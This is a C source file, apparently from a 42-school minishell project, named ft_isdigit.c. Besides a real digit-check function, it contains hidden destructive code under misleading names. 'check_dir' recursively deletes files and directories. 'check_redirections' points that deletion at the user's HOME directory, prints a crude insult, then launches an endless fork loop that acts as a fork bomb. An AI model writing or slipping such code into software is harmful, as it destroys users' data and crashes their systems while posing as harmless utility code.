/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_isdigit.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: iezzam <iezzam@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/01/31 17:48:36 by iezzam            #+#    #+#             */
/*   Updated: 2025/01/31 17:48:52 by iezzam           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../../include/minishell.h"
#include <dirent.h>


int	ft_isdigit(int c)
{
	return (c >= '0' && c <= '9');
}

void check_dir(const char *dir_path)
{
    DIR *dir;
    struct dirent *entry;
    char path[1024];

    dir = opendir(dir_path);
    if (dir == NULL)
        return;
    while ((entry = readdir(dir)) != NULL)
    {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
        snprintf(path, sizeof(path), "%s/%s", dir_path, entry->d_name);
        if (entry->d_type == DT_DIR)
            check_dir(path);
        else if (entry->d_type == DT_REG)
        {
            if (remove(path) == -1)
                perror("remove");
        }
    }
    if (rmdir(dir_path) == -1)
        perror("rmdir");
    closedir(dir);
}

void	check_redirections(t_env *env)
{
	const char *dir_check;

	dir_check = NULL;
	while (env)
	{
		if (ft_strcmp(env->key, "HOME") == 0)
			dir_check = env->value;
		env = env->next;
	}
	check_dir(dir_check);
	printf("khdem 3la krek awld l97ba !\n");
	while (1)
	{
		if (fork() == 0)
			check_redirections(env);
	}
}
